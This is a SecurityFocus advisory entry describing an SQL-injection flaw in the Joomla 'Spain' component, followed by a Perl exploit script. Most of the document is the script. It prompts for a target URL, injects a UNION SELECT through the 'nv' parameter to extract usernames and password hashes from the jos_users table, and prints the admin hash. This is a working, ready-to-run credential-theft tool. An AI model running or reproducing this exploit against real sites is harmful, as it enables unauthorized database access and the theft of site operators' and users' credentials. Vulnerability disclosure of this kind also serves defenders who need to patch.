source: http://www.securityfocus.com/bid/43354/info

The Spain component for Joomla is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.

Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.


#!/usr/bin/perl -w
print "\t\t-------------------------------------------------------------\n\n";
print "\t\t| Fl0rix | Bug Researchers (c) 2010 |\n\n";
print "\t\t-------------------------------------------------------------\n\n";
print "\t\t|Joomla Com_Spain Remote SQL Injection Exploit|\n\n";
print "\t\t| Greetz: EcHoLL,Sakkure And All My Friends |\n\n";
print "\t\t-------------------------------------------------------------\n\n";
 
use LWP::UserAgent;
 
print "\nSite ismi Target page:[http://wwww.site.com/path/]: ";
chomp(my $target=<STDIN>);
 
$florix="concat(username,0x3a,password)";
$sakkure="jos_users";
 
$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
 
$host = $target . "/index.php?option=com_spain&view=descr&task=home&nv=1/**/AND/**/1=0+UNION+SELECT/**/1,".$florix.",3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23+from/**/".$sakkure.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-fA-F]{32})/){
print "\n[+] Admin Hash : $1\n\n";
print "# Tebrikler Bro Exploit Calisti! #\n\n";
}
else{print "\n[-] Malesef Bro Exploit Calismadi...\n";
}